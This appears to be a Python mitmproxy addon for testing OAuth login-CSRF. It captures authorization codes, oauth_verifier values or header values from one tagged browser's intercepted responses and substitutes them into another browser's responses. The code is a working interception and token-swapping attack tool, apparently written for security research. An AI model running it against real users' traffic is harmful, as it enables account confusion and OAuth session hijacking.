import mitmproxy
from urllib.parse import urlparse
import mitmproxy.ctx as ctx
from logger import Log

class CSRF():

    def __init__(self, logger: Log):
        self.logger = logger
        self.browserID = "longming"
        self.RAM = "RAM/"

    """
        csrf on value in location header
    """
    def csrf_substitude_code_in_location(self, target, flow: mitmproxy.http.HTTPFlow):
        if "location" in flow.response.headers.keys():
            location = flow.response.headers["location"]
            if target not in location:
                return False
            self.logger.write_info("csrf on key value in location header")
            self.logger.write_info("[location]: " + location)
            if self.browserID in flow.request.headers.keys():
                key_value = extract_code_from_content(location, target)
                self.logger.write_info("[target] " + target + " " + key_value)
                self.logger.write_file(self.RAM + target, key_value)
                self.logger.write_info("Successfully save key value to " + self.RAM + target)
                flow.kill()
                self.logger.write_info("kill flow")
            else:
                self.logger.write_info("[ORIGIN " + target + "] " + extract_code_from_content(location, target))
                with open(self.RAM + target, 'r+') as f:
                    key_value = f.readlines()[0]
                self.logger.write_info("[CHANGE " + target + "] " + key_value)
                flow.response.headers["location"] = substitute_code(location, target, key_value)
                self.logger.write_info("If succeed? " + str(key_value in flow.response.headers["location"]))
            return True
        return False

    """
        csrf on value in response text
    """
    def csrf_substitude_code_in_text(self, target, flow: mitmproxy.http.HTTPFlow):
        if target in flow.response.text:
            self.logger.write_info("csrf on value in response text")
            if self.browserID in flow.request.headers.keys():
                key_value = extract_code_from_content(flow.response.text, target)
                self.logger.write_info("[target] " + target + " " + key_value)
                self.logger.write_file(self.RAM + target, key_value)
                self.logger.write_info("Successfully save key value to " + self.RAM + target)
                flow.kill()
                self.logger.write_info("kill flow")
            else:
                self.logger.write_info("[ORIGIN " + target + "] " + extract_code_from_content(flow.response.text, target))
                with open(self.RAM + target, 'r+') as f:
                    key_value = f.readlines()[0]
                self.logger.write_info("[CHANGE " + target + "] " + key_value)
                substitute_access_token_in_text(flow, target, key_value)
                self.logger.write_info("If succeed? " + str(key_value in flow.response.text))
            return True
        return False

    """
       csrf, change a whole header value
    """
    def csrf_substitude_header(self, target, flow: mitmproxy.http.HTTPFlow):
        if target in flow.response.headers.keys():
            self.logger.write_info("csrf change a whole header value")
            value = flow.response.headers[target]
            if self.browserID in flow.request.headers.keys():
                key_value = value
                self.logger.write_info("[target] " + target + " " + key_value)
                self.logger.write_file(self.RAM + target, key_value)
                self.logger.write_info("Successfully save key value to " + self.RAM + target)
                flow.kill()
                self.logger.write_info("kill flow")
            else:
                self.logger.write_info("[ORIGIN " + target + "] " + value)
                with open(self.RAM + target, 'r+') as f:
                    key_value = f.readlines()[0]
                self.logger.write_info("[CHANGE " + target + "] " + key_value)
                flow.response.headers[target] = key_value
                self.logger.write_info("If succeed? " + str(key_value in flow.response.headers[target]))

def extract_code_from_content(content, target):
    start = content.find(target) + len(target)
    end = content.find("&", start)
    ctx.log.info("target = " + target)
    if target == "oauth_verifier=":
        end = content.find("\"", start)
        ctx.log.info("end " + str(end))
    ctx.log.info(str(start) + " " + str(type(start)))
    token = content[start:end]
    return token

def substitute_access_token_in_text(flow: mitmproxy.http.HTTPFlow, target, new_value):
    content = flow.response.text
    start = content.find(target) + len(target)
    end = content.find("&", start)
    if target == "oauth_verifier=":
        end = content.find("\"", start)
    new_content = content[:start] + new_value + content[end:]
    flow.response.text = new_content

def substitute_code(content, target, new_value):
    start = content.find(target) + len(target)
    end = content.find("&", start)
    return content[:start] + new_value + content[end:]


